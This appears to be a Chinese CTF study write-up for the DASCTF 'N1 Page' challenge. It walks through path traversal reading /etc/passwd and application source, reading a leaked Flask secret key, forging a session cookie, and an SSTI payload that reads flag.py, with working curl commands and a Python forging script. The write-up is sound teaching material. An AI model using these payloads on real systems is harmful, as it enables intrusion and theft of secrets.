# 【N1 Page 全案笔记】从零到 flag 的完整逻辑链

> 平台：DASCTF ｜ flag：`n1book{afr_3_solved}` ｜ 2026-08-01
> 定位：任意文件读取专栏的【组合题】——5 个零件串成一条链

---

## 一、题目全景（先看整体，再看零件）

### 1.1 题目面貌

```
Welcome to N1 Page
Your name: [输入框]      ← 表单，POST 到 /n1page，参数 n1code
页面回显：Hello : 名字, why you don't look at our article?
外加一个链接：/article?name=article
```

### 1.2 考点全家桶（5 个零件）

| 零件 | 是什么 | 学过吗 |
|---|---|---|
| ① 路径穿越 → 任意文件读取 | /article 读任意文件 | ✅ u1s1 题 |
| ② /proc/self/cwd 读源码 | Linux 技巧（不猜路径） | 新 |
| ③ Flask session 伪造 | 密钥泄露 → 伪造 cookie | ✅ 3872 |
| ④ 过滤绕过（攻击面转移） | 表单过滤，session 不过滤 | 新 |
| ⑤ SSTI 模板注入 | 模板执行读文件 | 新 |

### 1.3 完整解题链（先记住这条线）

```
提交表单 → 发现 session cookie + article 链接
→ /article 穿越读 /etc/passwd（漏洞①实锤）
→ 读源码 server.py（/proc/self/cwd 不猜路径）
→ 源码情报：flag 在 flag.py / 密钥在 key.py / 模板有 SSTI / 过滤规则
→ 直接读 flag.py？被 "flag" 过滤拦 ✗
→ 读 key.py 拿密钥 → 伪造 session cookie（塞 SSTI payload，绕过过滤）
→ 提交 → 模板执行 → 读出 flag.py → flag ✅
```

---

## 二、基础概念层（每个零件单独搞懂）

## 2.1 服务器三件套：Linux + nginx + 后端语言

### 文件到底放在哪？

```
【第3层】浏览器
    ↓ URL
【第2层】nginx —— 软件（前台）：按 URL 去 Linux 取文件，本身不存文件
    ↓
【第1层】Linux —— 电脑/容器：所有文件都住这
    ├── /var/www/html/（网站文件）
    ├── /tmp/（图片）
    ├── /etc/passwd（系统文件）
    ├── /flag（flag）
    ├── Python 进程（后端程序）
    └── /proc/（进程信息）
```

**关键认知**："东西放 web 服务器上" = 放在 **Linux 文件系统**里；nginx 是"取货软件"不是"仓库"。漏洞 = 取货软件和仓库之间的缝隙（路径不拦 ../、权限太宽）。

### 后端语言 = 网站的"厨师"

```
动态网站 = nginx（前台） + 一个后端语言（厨师）
PHP    → include/eval 类漏洞
Python → render_template_string(SSTI)、Flask session
Java   → 反序列化
```

**漏洞跟着语言走 → 做题必须先认厨师。**

**认厨师方法**：
| 方法 | 例子 |
|---|---|
| 响应头 | `X-Powered-By: PHP` / `Server: Werkzeug`（Python Flask） |
| 页面扩展名 | `index.php` |
| 读源码 | `from flask import`（Python） |
| /proc/self/cmdline | `python server.py` |
| session cookie | `eyJ...`（JSON base64）= Flask 特征 |

### 2.2 Flask 项目文件结构

```
项目目录（/home/nu11111111l）
├── server.py          ← 主文件：定义所有 URL → 函数（路由表）
├── flag.py            ← 被主文件【加载】的数据（flag 变量）
├── key.py             ← 被主文件【加载】的数据（key 变量）
├── templates/         ← 页面模板（main.html / article.html）
└── static/            ← 静态资源
```

**路由概念**：
```python
@app.route("/article")     # URL /article 来了 → 执行下面的函数
def article():
    page = request.args.get('name', 'article')
    file_path = '/home/nu11111111l/articles/{}'.format(page)  # 用户输入拼路径！
    template = open(file_path).read()
    return render_template('article.html', template=template)
```

**修正一个理解**：路由不是"主文件调度其他文件"，是"URL 对应函数"；flag.py/key.py 是启动时被 `execfile()` 加载的"食材"。

**做题意义**：读主文件 = 拿到地图 = 知道每个 URL 干什么、读哪些文件、有什么过滤和漏洞。

### 2.3 任意文件读取 vs 路径穿越（目标 vs 手段）

```
任意文件读取 = 效果/目标："服务器上任何文件都能读"
路径穿越     = 手段之一："用 ../ 跳出限定目录"
LFI         = 手段之一："用 include 漏洞读"
alias 穿越  = 手段之一："用 nginx 配置错误读"
```

### 2.4 读文件 vs 列目录（为什么不能直接 list）

```
漏洞代码：open(路径).read()     ← 只能读【指定文件】，必须知道文件名
列目录需要：os.listdir(目录)    ← 列出所有文件名，漏洞代码没有
```

- 用 open() 读目录 → 报错（IsADirectoryError）
- 不知道文件名怎么办：**读源码找名字**（最佳）/ 猜常见名 / 读配置日志 / 读 /proc
- **源码 = 白嫖的目录册**（它写着引用了哪些文件）

### 2.5 /proc/self 系列（Linux 进程照妖镜）

```
/proc = 虚拟文件系统：内核实时生成的"监控窗口"，不是磁盘真实文件
/proc/self = 谁访问它，它就指向谁（我们请求时 = Python 进程自己）
/proc/self/cwd = 进程当前工作目录（= 代码启动时站的地方 = 项目目录）

/proc/self/cwd/server.py  → 读源码！不用猜路径（万能招）
/proc/self/cmdline        → 启动命令（python server.py → 认厨师）
/proc/self/environ        → 环境变量（可能有密钥/路径）
/proc/self/fd/            → 进程打开着的文件
```

**为什么万能**：Flask 启动必然站在自己的项目目录 → 不管部署在哪，`/proc/self/cwd/server.py` 都命中。

### 2.6 Flask session 伪造（复习 3872）

```
session cookie = {内容} + 密钥签名（防篡改）
内容可读（base64），签名防改
伪造 = 用密钥给"新内容"重新签名 → 服务器验签通过 → 信任
```

**key.py 泄露密钥 = 伪造任意 session 的印章到手。**

### 2.7 SSTI 模板注入

**模板是什么**：
```html
Hello: {{ name }}    ← {{ }} 是模板语法，渲染时替换
```
**render_template_string(字符串)** = 把字符串当模板渲染。
**漏洞**：字符串里有 `{{ 代码 }}` → 模板引擎【执行】它（不只是替换变量）。

**SSTI 读文件标准链**（从空字符串爬到文件类）：
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('flag.py').read() }}
''                    空字符串（模板里能拿的对象）
.__class__            它的类型（str 类）
.__mro__              继承链（str → object）
[2]                   爬到 object（所有类的祖先）
.__subclasses__()     object 的所有子类（Python 内置类全家谱）
[40]                  第 40 个 = file 类（能开文件的类）
('flag.py')           打开文件
.read()               读出内容
```

**白话**：从空字符串沿继承链爬到"祖宗"，翻全家谱找到"文件类"，用它打开 flag.py。**下标 [40] 随 Python 版本可能变，套路不变。**

---

## 三、解题逻辑链（每步的"为什么"）

### 第 1 步：信息收集
【观察】表单 + 提交后回显名字 + article 链接 + session cookie。
【为什么做】页面每个元素都是线索：cookie（Flask）、链接（/article 参数像文件名）。

### 第 2 步：确认穿越（/etc/passwd 为什么）
```bash
curl "靶机/article?name=../../../../etc/passwd"
```
【为什么用 /etc/passwd】Linux 必有 + 全世界可读 = 万能验证文件；读到了 = 漏洞实锤。
【为什么 4 个 ../】代码把 name 拼在 `/home/nu11111111l/articles/` 后面，`../` 一级级爬出限定目录到根目录（多写无害，Linux 不会掉出根）。

### 第 3 步：读什么？→ 读源码（设计图思维）
```bash
curl "靶机/article?name=../../../../proc/self/cwd/server.py"
```
【为什么读源码】不知道 flag 在哪、不知道过滤规则 → 猜是碰运气，源码（设计图）一次到位。**"能读任何文件"后的第一反应 = 读主文件。**
【为什么是 server.py】Flask 主文件惯例名 + cwd 指向项目目录。

### 第 4 步：源码情报提取

| 源码行 | 情报 | 行动 |
|---|---|---|
| `execfile('flag.py')` | flag 在 flag.py | 目标明确 |
| `execfile('key.py')` + `app.secret_key = key` | 密钥在 key.py | 可读（漏洞①）→ 伪造 session |
| `if 'flag' in page` | 穿越读 flag.py 被拦 | 直接读的路死了 |
| `n1code.replace(".","").replace("_","").replace("{","").replace("}","")` | 表单输入被过滤 | 表单路也死了 |
| `render_template_string(template)` | 模板渲染漏洞 | 新路：SSTI |

### 第 5 步：决策——攻击面转移
```
两条正路都堵死：
  直接穿越读 flag.py → "flag"过滤 ✗
  表单输 SSTI → ". _ { }"过滤 ✗
侧门：session 值【不过滤】（过滤只修了表单正门，没修 cookie 侧门）
→ 伪造 session = 绕过所有过滤
→ 伪造需要密钥 → key.py 读得到 → 闭环！
```

### 第 6 步：读 key.py 拿密钥
```bash
curl "靶机/article?name=../../../../proc/self/cwd/key.py"
# key = 'Drmhze6EPcv0fN_81Bj-nA'
```

### 第 7 步：伪造 cookie
```python
# forge_n1code.py
from itsdangerous import URLSafeTimedSerializer
payload = "{{''.__class__.__mro__[2].__subclasses__()[40]('flag.py').read()}}"
s = URLSafeTimedSerializer('Drmhze6EPcv0fN_81Bj-nA', salt='cookie-session',
                           signer_kwargs={'key_derivation': 'hmac'})
cookie = s.dumps({'n1code': payload})
```

### 第 8 步：提交
```bash
curl -X POST "靶机/n1page" -d "n1code=x" -H "Cookie: session=<伪造的>"
```
【为什么 n1code=x 无所谓】源码逻辑：session 里已有值 → 不覆盖 → 直接用 session 的 payload 渲染 → 执行 → flag。
【输出】`flag = 'n1book{afr_3_solved}'`

---

## 四、做题心法总结

### 为什么这题难？
- 不是知识难，是**密度高**：5 个零件第一次同时出现
- 组合题 = 每个零件都学过/见过，但"串起来"需要全局思维

### 三问法（卡住就问自己）
```
① 目标文件是什么？（flag.py —— 源码告诉的）
② 目标路径被什么堵住？（flag 过滤 / 表单过滤）
③ 有没有侧门？（session 不过滤 = 攻击面转移）
```

### 万能顺序（所有读文件题）
```
确认能读任意文件 → 读主文件源码（设计图）→ 提取情报（目标/过滤/漏洞/密钥）
→ 正路被堵就找侧门 → 组合已有技能 → flag
```

### 零件复习清单
| 技能 | 出处 |
|---|---|
| 路径穿越 + /etc/passwd 验证 | u1s1 题 / 本笔记 2.3 |
| /proc/self/cwd | 本笔记 2.5 |
| Flask session 伪造 | 3872 WP / 本笔记 2.6 |
| SSTI | 本笔记 2.7（后续 SSTI 专栏深入） |
| 攻击面转移 | 本笔记第 5 步 |
